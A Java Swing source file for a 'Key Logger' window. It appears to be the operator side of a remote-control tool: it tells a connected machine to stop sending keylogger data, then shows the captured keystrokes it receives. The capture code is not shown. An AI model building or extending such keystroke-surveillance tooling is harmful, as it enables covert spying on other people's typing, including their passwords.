package gui;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import Client.*;
public class CatchKeyLogger extends  JFrame{
    private JButton stopGettingKeyLoggerButton;
    private JTextField textField1;
    private JButton exitButton;
    private JLabel GetLabel;
    private JPanel panel1;
    private JTextArea textArea1;
    CatchKeyLogger _this = this;
    private String check ="";
    public CatchKeyLogger(Client sv) {
        super("Key Logger");
        this.setContentPane(panel1);
        this.setDefaultCloseOperation(EXIT_ON_CLOSE);
        this.pack();
        this.setSize(600,400);
        stopGettingKeyLoggerButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {

                try {
                    check = "true";
                    sv.sendMg("Stop Send keylogger");
                    String contentKeyLogger = sv.receiveMg();
                    System.out.println(contentKeyLogger);
                    textArea1.setText(contentKeyLogger);
                    GetLabel.setText("Got");
                } catch (IOException ex) {
                    throw new RuntimeException(ex);
                }
            }
        });
        exitButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try {
                    if(check.equals("true") != true) {
                        sv.sendMg("Stop Send keylogger");
                        String contentKeyLogger = sv.receiveMg();
                    }else {
                        System.out.println("exit");
                        sv.sendMg("exit");
                    }
                    //GetLabel.setText("Got");
                    _this.setVisible(false);
                } catch (IOException ex) {
                    throw new RuntimeException(ex);
                }
            }
        });
    }
}
